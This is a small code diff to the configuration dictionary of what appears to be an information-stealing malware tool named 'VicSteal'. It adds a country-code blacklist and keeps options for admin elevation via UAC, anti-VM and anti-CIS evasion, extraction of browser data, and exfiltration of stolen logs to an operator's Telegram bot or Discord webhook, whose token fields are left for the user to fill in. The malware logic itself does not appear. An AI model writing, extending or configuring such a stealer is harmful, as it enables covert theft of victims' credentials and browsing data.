@@ -3,13 +3,17 @@
 
 config: dict[str, str] = {
   "logFileName": f"VicSteal-New-Log",
+  "BLACKLIST": [ # Add the country codes you want to blacklist here.
+     "ar-ma",
+     "en-ma"
+  ],
   "UACAdmin": True,
   "antiVM": False,
   "sendToTelegram": True,
   "sendToDiscord": True,
-  "telegramBotToken": "",# write your telegram bot token here
-  "telegramChatId": "",# write your telegram chat id here
-  "discordWebhookUrl": "",# write your discord webhook url here
+  "telegramBotToken": "",# write your telegram bot token here.
+  "telegramChatId": "",# write your telegram chat id here.
+  "discordWebhookUrl": "",# write your discord webhook url here.
   "executionDelay": "",
   "antiCIS": True,
   "extractBrowsersData": True,
